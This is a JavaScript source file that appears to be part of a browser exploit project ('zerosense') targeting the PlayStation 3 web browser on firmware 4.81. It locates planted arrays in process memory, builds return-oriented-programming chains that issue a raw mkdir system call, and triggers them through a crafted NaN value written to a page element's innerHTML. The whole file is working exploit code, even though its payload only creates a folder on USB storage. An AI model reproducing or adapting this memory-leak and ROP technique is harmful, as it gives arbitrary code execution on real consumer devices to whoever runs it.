/*eslint-disable no-unused-vars, no-param-reassign*/

///////////////////////////////////////

var ArrayLeaker = require('zerosense/ArrayLeaker');
var ChainBuilder = require('zerosense/ChainBuilder');
var Logger = require('zerosense/Logger');
var MemoryReader = require('zerosense/MemoryReader');
var Searcher = require('zerosense/Searcher');
var Offsets = require('zerosense/Offsets');
var Util = require('zerosense/Util');

var logger = null;

var memoryReader = null;
var offsets = null;
var searcher = null;

(function() {
	try {
		var ua = navigator.userAgent;

		var environment = {};
		
		/*environment.ps3 = ua.indexOf("PLAYSTATION 3") !== -1;
		environment.firmware = environment.ps3 ? ua.substr(ua.indexOf("PLAYSTATION 3") + 14, 4)
				: "0.00";
		environment.dex = true;*/
		
		if (true) {
			environment.ps3 = true;
			environment.firmware = "4.81";
			environment.dex = true;
		}		

		var log = document.getElementById("log");
		if (log === null) {
			throw new Error("Log element not found.");
		}

		Logger.init(log);
		window.logger = logger = Logger.getLogger();
	} catch (e) {
		alert(e);
		console.error(e, e.name, e.stack);
		return;
	}

	try {
		logger.clear();

		if (environment.ps3) {
			logger.info(`Detected a PS3 on FW ${environment.firmware} ${environment.dex ? 'DEX' : 'CEX'}.`);
		} else {
			logger.info("No PS3 detected. May not work as expected.");
		}

		memoryReader = new MemoryReader();
		searcher = new Searcher(memoryReader);
		
		offsets = Offsets.get(environment);

		////////////////////
		
		var buttonCreateFolder = document.getElementById("buttonCreateFolder");
		buttonCreateFolder.addEventListener("click", () => createFolder());
		
		var buttonLogClear = document.getElementById("buttonLogClear");
		buttonLogClear.addEventListener("click", () => logger.clear());
	} catch (e) {
		if (environment.ps3) {
			alert(e);
		}
		console.error(e, e.name, e.stack);
	}
})();

///////////////////////////////////////

var arrayLeaker = null;
var buffer = null, addrBuffer = null;

function init() {
	if (arrayLeaker === null || !arrayLeaker.verify()) {
		logger.info("Initializing");
		
		arrayLeaker = new ArrayLeaker(memoryReader);
		arrayLeaker.createArray(20, "Obey the Moderator");
		
		var searchStart = 0x80190000;
		var searchEnd = 0x80600000;
		
		return searcher.startArray(searchStart, searchEnd - searchStart, arrayLeaker.getArray())
			.then((match) => {
				if (match === null) {
					throw new Error("Failed to init ArrayLeaker.");;
				}
				
				logger.info(`Found ArrayLeaker array at 0x${match.toString(16)}`);
				arrayLeaker.setAddress(match);
				
				logger.info("Creating buffers...");
				
				var i = 0;
				buffer = Util.ascii("gtmp") + Util.pad(0x1000);
				arrayLeaker.setString(i, buffer);
				addrBuffer = arrayLeaker.getStringAddress(i);
				if (addrBuffer === null) {
					logger.error("Failed to get buffer address.");
					return;
				}
				addrBuffer += 4;
				logger.info(`Found buffer at 0x${addrBuffer.toString(16)}`);
				
				logger.info("Created buffers.");
			});
	}
	
	return Promise.resolve();
}

function execute(address) {
	return new Promise((resolve) => {
		logger.info(`Starting chain at 0x${address.toString(16)}`);
		document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + address.toString(16));
		return resolve();
	});
}

function createFolder() {
	logger.info("Creating folder...");
	
	Promise.resolve()
		.then(() => init())
		.then(() => {
			var path = Util.ascii("/dev_usb000/zerosense");
			return mkdir(path).then((result) => {
				if (result.code < 0) {
					throw new Error("Error while creating folder: " + result.message);
				}
				
				logger.info(`Value: 0x${result.value.toString(16)}`);
			});
		})
		.then((result) => logger.info("Created folder."))
		.catch((error) => logger.error(`Error while creating folder: ${error}`));
}

function mkdir(strpath) {
	var i = 10;
	
	var chain = new ChainBuilder(offsets, addrBuffer)
		.addData("path", strpath)
		.syscallR3Data(0x32B, "path", 0o700, 0, 0, 0, 0, 0, 0)
		.storeR3Data("errno")
		.create();
	arrayLeaker.setString(i, chain.getData());
	var addrChainData = arrayLeaker.getStringAddress(i);
	if (addrChainData === null) {
		return Promise.resolve({ code: -1, message: "Failed to get chain data address." });
	}
	logger.info(`Found chain data at 0x${addrChainData.toString(16)}`);
	chain.updateDataAddress(addrChainData);

	i++;
	arrayLeaker.setString(i, chain.getChain());
	var addrChainStack = arrayLeaker.getStringAddress(i);
	if (addrChainStack === null) {
		return Promise.resolve({ code: -1, message: "Failed to get chain stack address." });
	}
	logger.info(`Found chain stack at 0x${addrChainStack.toString(16)}`);
	var chainStackOffset = 0x4;
	
	i++;
	var setup2 = ChainBuilder.setup2(addrChainStack + chainStackOffset);
	arrayLeaker.setString(i, setup2);
	var addrSetup2 = arrayLeaker.getStringAddress(i);
	if (addrSetup2 === null) {
		return Promise.resolve({ code: -1, message: "Failed to get setup2 address" });
	}
	logger.info(`Found setup2 at 0x${addrSetup2.toString(16)}`);
	
	i++;
	var setup1 = ChainBuilder.setup1(addrSetup2);
	arrayLeaker.setString(i, setup1);
	var addrSetup1 = arrayLeaker.getStringAddress(i);
	if (addrSetup1 === null) {
		return Promise.resolve({ code: -1, message: "Failed to get setup1 address." });
	}
	logger.info(`Found setup1 at 0x${addrSetup1.toString(16)}`);
	
	var addrChainStart = addrSetup1;
	logger.info(`Chain start at 0x${addrChainStart.toString(16)}`);
	
	return execute(addrChainStart).then(() => {
		var str = chain.getData().substr(chain.getDataOffset("errno") / 2, 0x4 / 2);
		var errno = Util.getint32(str);
		return { code: 0, value: errno };
	});
}

///////////////////////////////////////

